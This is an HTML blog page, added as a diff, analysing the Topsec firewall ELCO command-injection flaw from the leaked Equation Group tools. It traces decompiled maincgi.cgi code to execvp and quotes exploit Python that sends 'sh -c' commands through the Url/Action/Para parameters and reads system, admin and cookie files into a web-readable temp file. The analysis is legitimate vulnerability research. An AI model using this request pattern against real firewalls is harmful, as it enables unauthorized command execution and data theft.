@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="DshtAnger" />
+
+
+
+<meta name="description" content="近期NSA方程式组织被泄漏出的针对天融信防火墙的漏洞利用中，有一处名为ELCO-Eligible Contestant的漏洞  
+该漏洞是TOS系统中入口文件maincgi.cgi文件里处理post请求产生的一个命令执行漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Topsec ECLO 漏洞利用分析">
+<meta property="og:url" content="http://yoursite.com/2016/08/17/Topsec_ELCO_Analy/index.html">
+<meta property="og:site_name" content="DshtAnger">
+<meta property="og:description" content="近期NSA方程式组织被泄漏出的针对天融信防火墙的漏洞利用中，有一处名为ELCO-Eligible Contestant的漏洞  
+该漏洞是TOS系统中入口文件maincgi.cgi文件里处理post请求产生的一个命令执行漏洞">
+<meta property="og:updated_time" content="2016-10-11T16:07:24.172Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Topsec ECLO 漏洞利用分析">
+<meta name="twitter:description" content="近期NSA方程式组织被泄漏出的针对天融信防火墙的漏洞利用中，有一处名为ELCO-Eligible Contestant的漏洞  
+该漏洞是TOS系统中入口文件maincgi.cgi文件里处理post请求产生的一个命令执行漏洞">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="DshtAnger" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>Topsec ECLO 漏洞利用分析 | DshtAnger</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: false
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/hacker.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">DshtAnger</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">To Be A Hacker</p>
+        
+
+        
+
+
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa GitHub" href="https://github.com/DshtAnger" title="GitHub"></a>
+                            
+                                <a class="fa Email" href="mailto:568274449@qq.com" title="Email"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">DshtAnger</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/hacker.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">DshtAnger</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">To Be A Hacker</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/DshtAnger" title="GitHub"></a>
+                            
+                                <a class="fa Email" target="_blank" href="mailto:568274449@qq.com" title="Email"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-Topsec_ELCO_Analy" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/08/17/Topsec_ELCO_Analy/" class="article-date">
+      <time datetime="2016-08-17T07:15:06.000Z" itemprop="datePublished">2016-08-17</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Topsec ECLO 漏洞利用分析
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Binary/">Binary</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>近期NSA方程式组织被泄漏出的针对天融信防火墙的漏洞利用中，有一处名为<code>ELCO-Eligible Contestant</code>的漏洞  </p>
+<p>该漏洞是TOS系统中入口文件<code>maincgi.cgi</code>文件里处理post请求产生的一个<code>命令执行漏洞</code></p>
+<a id="more"></a>
+<h1 id="天融信ELCO-Eligible-Contestant漏洞利用分析"><a href="#天融信ELCO-Eligible-Contestant漏洞利用分析" class="headerlink" title="天融信ELCO-Eligible Contestant漏洞利用分析"></a>天融信ELCO-Eligible Contestant漏洞利用分析</h1><h2 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h2><h3 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1. 漏洞简介"></a>1. 漏洞简介</h3><p>天融信是中国领先的信息安全产品与服务解决方案提供商。基于创新的 “可信网络架构”以及业界领先的信息安全产品与服务，天融信致力于改善用户网络与应用的可视性、可用性、可控性和安全性，降低安全风险，创造业务价值   </p>
+<p>近期NSA方程式组织被泄漏出的针对天融信防火墙的漏洞利用中，有一处名为<code>ELCO-Eligible Contestant</code>的漏洞  </p>
+<p>该漏洞是TOS系统中入口文件<code>maincgi.cgi</code>文件里处理post请求产生的一个<code>命令执行漏洞</code></p>
+<h3 id="2-漏洞影响"><a href="#2-漏洞影响" class="headerlink" title="2. 漏洞影响"></a>2. 漏洞影响</h3><p>攻击者可以在通过构造特定post请求，在防火墙设备上执行任意命</p>
+<h3 id="3-漏洞触发条件"><a href="#3-漏洞触发条件" class="headerlink" title="3. 漏洞触发条件"></a>3. 漏洞触发条件</h3><p>版本：TOS <code>3.3.005.057.1</code> to <code>3.3.010.024.1</code><br>端口：port <code>443</code> open<br>硬件：not <code>ARM</code> based firewalls  </p>
+<h2 id="二、漏洞原理分析"><a href="#二、漏洞原理分析" class="headerlink" title="二、漏洞原理分析"></a>二、漏洞原理分析</h2><p>该漏洞是<code>maincgi.cgi</code>文件处理post请求存在缺陷导致漏洞的产生，主函数调用逻辑大致如下：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">int __cdecl main()</div><div class="line">&#123;</div><div class="line">	......</div><div class="line">	printf(&quot;Cache-Control: no-cache\r\n&quot;);</div><div class="line">	printf(&quot;Pragma: no-cache\r\n&quot;);</div><div class="line">	v17 = (int)getenv(&quot;HTTP_COOKIE&quot;);</div><div class="line">	//接下来几个调用为关键点</div><div class="line">	//关键点1</div><div class="line">	sub_815AD34();</div><div class="line">	//关键点2</div><div class="line">	cgiFormStringNoNewlines((int)&quot;Url&quot;, &amp;s1, 32);</div><div class="line">	if ( !strcmp(&amp;s1, &quot;Command&quot;) )</div><div class="line">	&#123;</div><div class="line">	  cgi_init_headers();</div><div class="line">	  //关键点3</div><div class="line">	  sub_8105F42();</div><div class="line">	  return 0;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>关键点1，跟进到<code>sub_815AD34()</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">signed int sub_815AD34()</div><div class="line">&#123;</div><div class="line">  _BYTE *k; // [sp+18h] [bp-10h]@13</div><div class="line">  char *i; // [sp+1Ch] [bp-Ch]@7</div><div class="line">  </div><div class="line">  ......</div><div class="line">  </div><div class="line">  //关键点1.1</div><div class="line">  sub_815B140((int)&amp;dword_823A974, &quot;REQUEST_METHOD&quot;);</div><div class="line">  ......</div><div class="line">  </div><div class="line">  //关键点1.2</div><div class="line">  if ( !sub_815E67F(dword_823A974, &quot;post&quot;) )</div><div class="line">  &#123;</div><div class="line">    if ( sub_815E67F(dword_823A974, &quot;get&quot;) )</div><div class="line">    &#123;</div><div class="line">      n = strlen(dword_823ADC0);</div><div class="line">      if ( sub_815C398() )</div><div class="line">      &#123;</div><div class="line">        cgiFreeResources();</div><div class="line">        return -1;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    goto LABEL_29;</div><div class="line">	</div><div class="line">	......</div><div class="line"></div><div class="line">LABEL_29:</div><div class="line">    dword_822F1B4 = 1;</div><div class="line">    return 0;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>关键点1.1，和请求方式有关，跟进到函数<code>sub_815B140()</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">调用：sub_815B140((int)&amp;dword_823A974, &quot;REQUEST_METHOD&quot;);</div><div class="line"></div><div class="line">int __cdecl sub_815B140(int a1, char *name)</div><div class="line">&#123;</div><div class="line">  int result; // eax@1</div><div class="line"></div><div class="line">  *(_DWORD *)a1 = getenv(name);</div><div class="line">  result = a1;</div><div class="line">  </div><div class="line">  if ( !*(_DWORD *)a1 )</div><div class="line">  &#123;</div><div class="line">    result = a1;</div><div class="line">    *(_DWORD *)a1 = &amp;byte_81F9374;</div><div class="line">  &#125;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>形参<code>a1</code>即<code>dword_823A974</code>的地址，name指针为”REQUEST_METHOD”的首地址，系统函数<code>getenv()</code>返回name指向的环境变量的具体值，并赋值给a1即dword_823A974。当请求为post时，变量<code>dword_823A974</code>将获得字符串<code>&quot;post&quot;</code>的首地址。   </p>
+<p>回到关键点1.2，此时dword_823A974指向了”post”，跟进到<code>sub_815E67F()</code>中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">调用：sub_815E67F(dword_823A974, &quot;post&quot;);</div><div class="line"></div><div class="line">int __cdecl sub_815E67F(_BYTE *a1, _BYTE *a2)</div><div class="line">&#123;</div><div class="line">  int v2; // ebx@6</div><div class="line"></div><div class="line">  while ( 1 )</div><div class="line">  &#123;</div><div class="line">    if ( !*a1 )</div><div class="line">      return *a2 == 0;</div><div class="line">    if ( !*a2 )</div><div class="line">      return 0;</div><div class="line">    if ( !(*(_WORD *)(_ctype_b + 2 * *a1) &amp; 0x400) )</div><div class="line">      break;</div><div class="line">    v2 = tolower(*a1);</div><div class="line">    if ( v2 != tolower(*a2) )</div><div class="line">      return 0;</div><div class="line">LABEL_10:</div><div class="line">    ++a1;</div><div class="line">    ++a2;</div><div class="line">  &#125;</div><div class="line">  if ( *a1 == *a2 )</div><div class="line">    goto LABEL_10;</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>该函数用移动字符指针的方式，依次比较两个参数所指向字符串的每一个字符，并且只进行小写比较，最终返回0  </p>
+<p>这样就进入关键点1.2的if语句块，经过goto到LABEL_29，再返回0  </p>
+<p>回到main()中，关键点2，跟进<code>cgiFormStringNoNewlines()</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">调用：cgiFormStringNoNewlines((int)&quot;Url&quot;, &amp;s1, 32);</div><div class="line"></div><div class="line">int __cdecl cgiFormStringNoNewlines(int a1, char *dest, int a3)</div><div class="line">&#123;</div><div class="line">  signed int v4; // [sp+10h] [bp-8h]@2</div><div class="line">  const char **v5; // [sp+14h] [bp-4h]@1</div><div class="line">  //关键点2.1</div><div class="line">  v5 = sub_815E7CD((char *)a1);</div><div class="line">  if ( v5 )</div><div class="line">  &#123;</div><div class="line">	//关键点2.2</div><div class="line">    v4 = sub_815D063((int)v5, dest, a3, 0);</div><div class="line">  &#125;</div><div class="line">  else</div><div class="line">  &#123;</div><div class="line">    strcpy(dest, &amp;byte_81F9374);</div><div class="line">    v4 = 4;</div><div class="line">  &#125;</div><div class="line">  return v4;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>形参a1指向<code>&quot;Url&quot;</code>，跟进关键点2.1处，<code>sub_815E7CD()</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">调用：v5 = sub_815E7CD((char *)a1);</div><div class="line"></div><div class="line">const char **__cdecl sub_815E7CD(char *a1)</div><div class="line">&#123;</div><div class="line">  dword_822F1B8 = a1;</div><div class="line">  dword_822F1BC = dword_8238840;</div><div class="line">  return sub_815E7EC();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><code>dword_822F1B8</code>指向<code>&quot;Url&quot;</code>，跟进<code>sub_815E7EC()</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">const char **sub_815E7EC()</div><div class="line">&#123;</div><div class="line">  const char **v2; // [sp+14h] [bp-4h]@2</div><div class="line"></div><div class="line">  while ( dword_822F1BC )</div><div class="line">  &#123;</div><div class="line">    v2 = (const char **)dword_822F1BC;</div><div class="line">    dword_822F1BC = *(_DWORD *)(dword_822F1BC + 24);</div><div class="line">    if ( !strcmp(*v2, dword_822F1B8) )</div><div class="line">      return v2;</div><div class="line">  &#125;</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>上面函数返回后，v5不为0，进入if语句块  </p>
+<p>关键点2.2，跟进<code>sub_815D063()</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">调用：sub_815D063((int)v5, dest, a3, 0);</div><div class="line"></div><div class="line">signed int __cdecl sub_815D063(int a1, _BYTE *a2, int a3, int a4)</div><div class="line">&#123;</div><div class="line">	 signed int v5;</div><div class="line">	 int v7;</div><div class="line">	 _BYTE *i; // [sp+20h] [bp-8h]@1</div><div class="line">	 _BYTE *v14; // [sp+24h] [bp-4h]@1</div><div class="line">	 ......</div><div class="line">	 v12 = 0;</div><div class="line">	 v11 = 0;</div><div class="line">	 v10 = a3 - 1;</div><div class="line">	 //目标字符串空间首地址</div><div class="line">	 v14 = a2;</div><div class="line">	 //检测是否读到行尾，v7取得当前指向字符的地址值</div><div class="line">	 for ( i = *(_BYTE **)(a1 + 4); ; ++i )</div><div class="line">	 &#123;</div><div class="line">	   v7 = *i;</div><div class="line">	   if ( v7 != 13 &amp;&amp; v7 != 10 )</div><div class="line">	     break;</div><div class="line">	   if ( v7 == 13 )</div><div class="line">	     ++v9;</div><div class="line">	   else</div><div class="line">	     ++v8;</div><div class="line">	LABEL_22:</div><div class="line">	   ;</div><div class="line">	 &#125;</div><div class="line">	 ......</div><div class="line">	 if ( !v7 )</div><div class="line">	    goto LABEL_23;</div><div class="line">	 //复制每一个字符到目标字符串空间，也就是dest</div><div class="line">	 if ( v11 &lt; v10 )</div><div class="line">	 &#123;</div><div class="line">	   *v14++ = v7;</div><div class="line">	   ++v11;</div><div class="line">	   goto LABEL_22;</div><div class="line">	 &#125;</div><div class="line">	 ......</div><div class="line">	 return v5;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>函数返回后，回到关键点2，调用<code>cgiFormStringNoNewlines((int)&quot;Url&quot;, &amp;s1, 32);</code>后<code>s1</code>将指向post请求中传递的参数<code>Url</code>所对应的字符串首地址  </p>
+<p>关键点2下面的if语句块，当参数Url传进的字符是<code>&quot;Command&quot;</code>时，将进入函数体内：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">if ( !strcmp(&amp;s1, &quot;Command&quot;) )</div><div class="line">&#123;</div><div class="line">	......</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>关键点3，跟进<code>sub_8105F42()</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">signed int sub_8105F42()</div><div class="line">&#123;</div><div class="line">  ......</div><div class="line">  char *argv; // [sp+30h] [bp-328h]@16</div><div class="line">  ......</div><div class="line">  char file; // [sp+2B0h] [bp-A8h]@1</div><div class="line">  char s; // [sp+2D0h] [bp-88h]@1</div><div class="line">  memset(&amp;s, 0, 0x80u);</div><div class="line">  //跟前面的分析一样，下面两个调用后，file、s分别获得参数Action、Para的字符串值的首地址字符</div><div class="line">  cgiFormStringNoNewlines((int)&quot;Action&quot;, &amp;file, 32);</div><div class="line">  cgiFormStringNoNewlines((int)&quot;Para&quot;, &amp;s, 128);</div><div class="line">  ......</div><div class="line">  pid = fork();</div><div class="line">  if ( !pid )</div><div class="line">  &#123;</div><div class="line">    close(pipedes);</div><div class="line">    dup2(fd, 1);</div><div class="line">    dup2(fd, 2);</div><div class="line">	</div><div class="line">	//接下来将字符s直到&apos;\0&apos;前整个字符串依次赋给argv所指向的字符数组</div><div class="line">    v7 = &amp;s;</div><div class="line">    v6 = &amp;s;</div><div class="line">    v5 = 0;</div><div class="line">    while ( *v6 )</div><div class="line">    &#123;</div><div class="line">      if ( *v6 == 32 )</div><div class="line">      &#123;</div><div class="line">        *v6 = 0;</div><div class="line">        (&amp;argv)[4 * v5++] = v7;</div><div class="line">        v7 = ++v6;</div><div class="line">      &#125;</div><div class="line">      else if ( !*++v6 )</div><div class="line">      &#123;</div><div class="line">        (&amp;argv)[4 * v5] = v7;</div><div class="line">        v4[v5] = 0;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    //关键点，执行系统PATH路径中，file所指向名字的程序，并传递argv指向的参数值给该程序</div><div class="line">    //该函数两个参数均由post请求提交，均可控</div><div class="line">    execvp(&amp;file, &amp;argv);</div></pre></td></tr></table></figure></p>
+<p>如果file指向<code>&quot;sh -c&quot;</code>，argv指向<code>&quot;ls&quot;</code>等系统命令，那么就能达到执行任意系统命令的目的。</p>
+<h2 id="三、漏洞利用分析"><a href="#三、漏洞利用分析" class="headerlink" title="三、漏洞利用分析"></a>三、漏洞利用分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">.....</div><div class="line">def touch(self,resp=None):</div><div class="line">    out = []</div><div class="line">    if not resp:</div><div class="line">        resp = self.head(self.target_url)</div><div class="line">    if &apos;etag&apos; in resp.headers:</div><div class="line">        etag,date = self._parse_etag(resp.headers[&apos;etag&apos;])</div><div class="line">        ##</div><div class="line"></div><div class="line">        out.append(&quot;Etag - %s; Last modified - %s&quot; % (etag,date))</div><div class="line">    self.timeout = None</div><div class="line">    return out</div></pre></td></tr></table></figure>
+<p>获取<code>etag</code>标识和修改时间<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">def probe(self):</div><div class="line">    temp = randstr(7)</div><div class="line">    ##</div><div class="line"></div><div class="line">    self.log.info(&quot;Scheduling cleanup in 60 seconds...&quot;)</div><div class="line">    self._run_cmd(&quot;( sleep 60 &amp;&amp; rm -f /www/htdocs/site/pages/.%s )&quot; % temp)</div><div class="line"></div><div class="line">    self.log.info(&quot;Probing system and retrieving target info...&quot;)</div><div class="line">    ##</div><div class="line"></div><div class="line">    self._run_cmd(&quot;( cat /e*/is* &amp;&amp; uname -a &amp;&amp; /t*/b*/cfgt* system admininfo showonline &amp;&amp; cat /*/*coo*/* )&gt;/www/htdocs/site/pages/.%s&quot;% temp)</div><div class="line">    res = self.get(&quot;/site/pages/.%s&quot; % temp)</div><div class="line">    self.log.info(&quot;System information retrieved:\n&quot;+res.content)</div><div class="line"></div><div class="line">    self.log.info(&quot;Forcing removal of temp file from target now...&quot;)</div><div class="line">    self._run_cmd(&quot;killall sleep &amp;&amp; rm -f /www/htdocs/site/pages/.%s&quot; % temp)</div><div class="line">    if res.content.find(&quot;i686&quot;) == -1:</div><div class="line">        return &quot;System does not appear to be x86. Probably not exploitable.&quot;</div><div class="line">    if res.content.find(&quot;tospass&quot;) != -1 or res.content.find(&quot;superman&quot;) != -1:</div><div class="line">        self.log.warning(&quot;User may be logged in. PLEASE REVIEW SYSTEM INFO&quot;)</div></pre></td></tr></table></figure></p>
+<p>探测目标是否可以利用，如果不是x86体系结构也不能利用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">def _run_cmd(self,cmd,content=None,**kwargs):</div><div class="line">    params = &#123;</div><div class="line">                &quot;Url&quot;:&quot;Command&quot;,</div><div class="line">                &quot;Action&quot;:&quot;sh&quot;,</div><div class="line">                &quot;Para&quot;:&quot;sh -c &quot;+cmd.replace(&quot; &quot;,&quot;\t&quot;)</div><div class="line">    &#125;</div><div class="line">    if content:</div><div class="line">        c = StringIO(content)</div><div class="line">        kwargs[&apos;data&apos;],kwargs[&apos;files&apos;] = params,&#123;randstr(5):c&#125;</div><div class="line">        //post提交</div><div class="line">        return self.post(self.exploit_url,**kwargs)</div><div class="line">    else:</div><div class="line">        kwargs[&apos;params&apos;] = params</div><div class="line">        return self.get(self.exploit_url,**kwargs)</div></pre></td></tr></table></figure></p>
+<p>Exp的主要逻辑，通过构造post请求，提交前面提到的Url、Action、Para等主要参数  </p>
+<p>通过向<code>sh</code>程序传递shell指令，达到任意命令执行   </p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2016/10/09/using_Hexo_buildBlog/">
+                    使用Hexo建立博客
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2016/08/15/Zabbix_insertDB_Injection/">
+                    Zabbix insertDB()注入漏洞分析
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
